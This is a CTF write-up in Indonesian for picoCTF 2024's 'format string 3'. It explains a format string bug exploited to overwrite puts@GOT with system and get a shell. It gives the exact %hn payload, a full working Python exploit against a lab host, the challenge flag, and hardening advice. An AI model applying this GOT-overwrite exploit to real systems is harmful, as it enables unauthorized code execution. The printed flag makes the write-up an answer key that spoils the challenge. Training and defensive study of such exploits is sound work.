# 449 - format string 3 (Binary Exploitation, picoCTF 2024, Medium)

## Challenge Metadata
- ID: 449 | Event: picoCTF 2024 | Author: Mubarak Mikail
- Category: Binary Exploitation / GOT Overwrite | Difficulty: Medium (2) | Points: 200
- Flag: `academy{G07_G07?_a42d872f}`

---

## Problem Statement & Scope
Diberikan berkas biner ELF 64-bit non-PIE (`format-string-3`), pustaka dinamis C (`libc.so.6`), pemuat dinamis (`ld-linux-x86-64.so.2`), dan kode sumber C (`format-string-3.c`).
Program tidak memiliki fungsi kemenangan bawaan (*win function*). Alur eksekusi program didefinisikan sebagai:
```c
char *normal_string = "/bin/sh";

void hello() {
    puts("Howdy gamers!");
    printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
    char *all_strings[MAX_STRINGS] = {NULL};
    char buf[1024] = {'\0'};

    setup();
    hello();

    fgets(buf, 1024, stdin);
    printf(buf);

    puts(normal_string);

    return 0;
}
```
Program membocorkan alamat runtime fungsi `setvbuf` di pustaka `libc`, kemudian membaca masukan pengguna ke dalam `buf` dan memanggil `printf(buf)`. Tepat setelahnya, program mengeksekusi `puts(normal_string)` di mana `normal_string` berisi string `"/bin/sh"`.
Peserta ditugaskan untuk membajak resolusi fungsi dinamis (*Dynamic Function Dispatch*) agar pemanggilan `puts("/bin/sh")` berubah menjadi eksekusi `system("/bin/sh")` dan memberikan interaksi shell interaktif.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Uncontrolled Format String Vulnerability (CWE-134):**
   Masukan pengguna yang dibaca melalui `fgets(buf, 1024, stdin)` dievaluasi langsung oleh `printf(buf)`. Hal ini memberikan kemampuan pembacaan dan penulisan memori arbitrer melalui penentu konversi format string C (`%p`, `%x`, `%n`, `%hn`).

2. **Kelemahan Partial RELRO & Global Offset Table (GOT) Overwrite:**
   Pada arsitektur Linux ELF dengan *lazy binding* atau proteksi *Partial RELRO*:
   - Bagian `.got.plt` tetap memiliki izin baca-tulis (*writable* / `RW`).
   - Setiap fungsi pustaka bersama yang dipanggil melalui *Procedure Linkage Table* (PLT) melompat ke alamat yang tersimpan pada tabel *Global Offset Table* (GOT).
   - Melalui pemeriksaan `readelf -r format-string-3`:
     ```text
     000000404000  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
     ```
     Entri `puts@got` terletak pada alamat statis `0x404000`.
   - Menimpa entri `puts@got` dengan alamat fungsi `system` menyebabkan pemanggilan `puts(arg)` berikutnya mengeksekusi `system(arg)`.

3. **Rekonsiliasi ASLR & Resolusi Simbol Libc:**
   Karena ASLR aktif pada sistem host target, basis pemuatan `libc.so.6` berubah secara acak pada setiap eksekusi. Namun, program memberikan *information leak* eksplisit:
   ```text
   Here's the address of setvbuf in libc: 0x...
   ```
   Berdasarkan berkas `libc.so.6` yang disediakan:
   - Offset simbol `setvbuf`: `0x7a3f0`
   - Offset simbol `system`: `0x4f760`
   - Alamat basis libc dihitung sebagai:
     $$\text{libc\_base} = \text{setvbuf\_addr} - 0\text{x}7\text{a}3\text{f}0$$
   - Alamat absolut fungsi `system`:
     $$\text{system\_addr} = \text{libc\_base} + 0\text{x}4\text{f}760$$

4. **Penulisan 16-Bit Dual Half-Word via `%hn`:**
   Pada alamat `system_addr`, 32 bit terbawah ($2 \times 16\text{-bit}$) dapat dipecah menjadi dua bagian:
   - $v_1 = \text{system\_addr} \ \& \ 0\text{xFFFF}$ (ditulis ke `0x404000`)
   - $v_2 = (\text{system\_addr} \gg 16) \ \& \ 0\text{xFFFF}$ (ditulis ke `0x404002`)
   Buffer pengguna `buf` terletak pada indeks argumen posisi stack ke-38 (`%38$p`).

---

## Metodologi Pengujian NIST SP 800-115
Berdasarkan panduan NIST SP 800-115 (*Technical Guide to Information Security Testing and Assessment*):

1. **Fase Perencanaan & Penemuan (Planning & Discovery):**
   - Menelaah kode sumber C (`format-string-3.c`) dan biner biner target.
   - Menganalisis parameter proteksi biner (`checksec`): Partial RELRO, No PIE, Canary Found, NX Enabled.
   - Mengidentifikasi keberadaan pointer `normal_string = "/bin/sh"` yang diteruskan ke `puts()`.
2. **Fase Analisis Kerentanan (Vulnerability Analysis):**
   - Menemukan kelemahan format string arbitrer pada `printf(buf)`.
   - Mengamati kelemahan relokasi memori Partial RELRO di mana entri `.got.plt` dapat ditulisi pada saat runtime.
   - Menghitung delta offset antara simbol `setvbuf` dan `system` pada `libc.so.6`.
   - Memetakan tata letak stack proses: buffer input `buf` berada di indeks argumen 38.
3. **Fase Eksploitasi & Verifikasi (Attack Execution & Verification):**
   - Menghubungkan client ke port TCP container on-demand.
   - Membaca bocoran alamat `setvbuf`, menghitung `libc_base` dan `system_addr`.
   - Membangun payload penulisan memori multi-halfword (`%hn`) terurut secara numerik.
   - Mengirimkan format string terpadat beserta argumen penunjuk alamat `0x404000` dan `0x404002`.
   - Mengalirkan perintah shell `cat flag.txt\n` ke stdin proses shell baru dan menangkap flag resmi.
4. **Fase Remediasi & Mitigasi (Remediation):**
   - Memberikan rekomendasi penerapan Full RELRO dan penggunaan format string statis.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Relokasi GOT & Offset Libc:**
   Periksa alamat entri GOT untuk `puts`:
   ```bash
   readelf -r format-string-3 | grep puts
   # 000000404000  000200000007 R_X86_64_JUMP_SLO  puts@GLIBC_2.2.5 + 0
   ```
   Periksa offset `setvbuf` dan `system` pada pustaka `libc.so.6`:
   ```bash
   readelf -s libc.so.6 | grep -E " (setvbuf|system)@@"
   # 1300: 000000000007a3f0   608 FUNC    WEAK   DEFAULT   16 setvbuf@@GLIBC_2.2.5
   # 1511: 000000000004f760    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5
   ```
2. **Koneksi dan Parsing Runtime Leak:**
   Hubungkan socket ke target (`chatelaine.cylabacademy.net:20828`):
   ```text
   Howdy gamers!
   Okay I'll be nice. Here's the address of setvbuf in libc: 0x70ad2e4e23f0
   ```
   Kalkulasi runtime:
   - `libc_base = 0x70ad2e4e23f0 - 0x7a3f0 = 0x70ad2e468000`
   - `system_addr = 0x70ad2e468000 + 0x4f760 = 0x70ad2e4b7760`
   - Nilai 16-bit:
     - $v_1 = \text{0x7760}$ (desimal 30560)
     - $v_2 = \text{0x2e4b}$ (desimal 11851)
3. **Penyusunan Format String & Penulisan GOT:**
   Karena $v_2 < v_1$ (11851 < 30560), tulis $v_2$ terlebih dahulu ke `0x404002`, kemudian tambahkan $v_1 - v_2 = 30560 - 11851 = 18709$ karakter dan tulis ke `0x404000`.
   Format string disusun dengan $K=4$ quadword (32 byte):
   ```text
   %11851c%42$hn%18709c%43$hnAAAAAA\x02\x40\x40\x00\x00\x00\x00\x00\x00\x40\x40\x00\x00\x00\x00\x00
   ```
4. **Trigger Shell & Pengambilan Flag:**
   Setelah panggilan `printf(buf)` selesai, baris berikutnya `puts(normal_string)` melompat ke `system("/bin/sh")`. Perintah `cat flag.txt` yang dikirimkan langsung dieksekusi oleh shell:
   ```text
   academy{G07_G07?_a42d872f}
   ```

---

## Script Reproduksi & PoC
Implementasi otomasi Python lengkap tersedia pada `scripts/solve_449_format_string_3.py`:
```python
import socket
import struct
import re
import time

HOST = "chatelaine.cylabacademy.net"
PORT = 20828

s = socket.create_connection((HOST, PORT), timeout=10)
time.sleep(0.3)

initial = b""
while b"libc: 0x" not in initial:
    chunk = s.recv(1024)
    if not chunk:
        break
    initial += chunk
while b"\n" not in initial.split(b"libc: 0x")[1]:
    initial += s.recv(1024)

m = re.search(r"setvbuf in libc: (0x[0-9a-fA-F]+)", initial.decode("utf-8", errors="ignore"))
setvbuf_addr = int(m.group(1), 16)
libc_base = setvbuf_addr - 0x7A3F0
system_addr = libc_base + 0x4F760

v1 = system_addr & 0xFFFF
v2 = (system_addr >> 16) & 0xFFFF

items = [(v1, 0x404000), (v2, 0x404002)]
items.sort(key=lambda x: x[0])

K = 4
a1_idx = 38 + K
a2_idx = 38 + K + 1

val1, addr1 = items[0]
val2, addr2 = items[1]

fmt = f"%{val1}c%{a1_idx}$hn%{val2 - val1}c%{a2_idx}$hn"
pad = K * 8 - len(fmt)
fmt_padded = fmt + "A" * pad
addrs = struct.pack("<QQ", addr1, addr2)
payload = fmt_padded.encode() + addrs

s.sendall(payload + b"\n")
time.sleep(0.5)

s.sendall(b"cat flag.txt\n")
time.sleep(0.5)

resp = s.recv(4096).decode(errors="ignore")
s.close()

flag = re.search(r"academy\{[^}]+\}", resp).group(0)
print("Flag:", flag)
```

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{G07_G07?_a42d872f}`
- **Metode Verifikasi:**
  HTTP POST `/api/submissions/` dengan payload JSON:
  ```json
  {"challenge": 449, "flag": "academy{G07_G07?_a42d872f}"}
  ```
  Respons platform: `HTTP 201 Created` dengan `{"correct": true}`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
1. **Bahaya Partial RELRO pada Biner Native (CWE-134 / CWE-822):**
   Partial RELRO hanya melindungi segmen internal ELF tertentu tetapi membiarkan tabel `.got.plt` tetap dapat dimodifikasi. Setiap celah penulisan memori arbitrer (seperti format string `%n`) dapat dieksploitasi untuk membajak penunjuk fungsi API sistem.
2. **Mitigasi Full RELRO (NIST SP 800-115 Hardening):**
   Wajib mengaktifkan Full RELRO saat kompilasi biner:
   ```bash
   gcc -Wl,-z,relro,-z,now ...
   ```
   Flag `-z,now` memaksa dynamic linker menyelesaikan semua simbol GOT saat pemuatan awal program (*immediate binding*) dan mengubah seluruh segmen GOT menjadi *read-only* (`R--`), sehingga upaya penulisan ke alamat GOT akan memicu *Segmentation Fault* seketika.
3. **Sanitasi Pemanggilan Output String:**
   Ganti `printf(buf)` dengan fungsi statis `printf("%s", buf)` atau `fputs(buf, stdout)`.
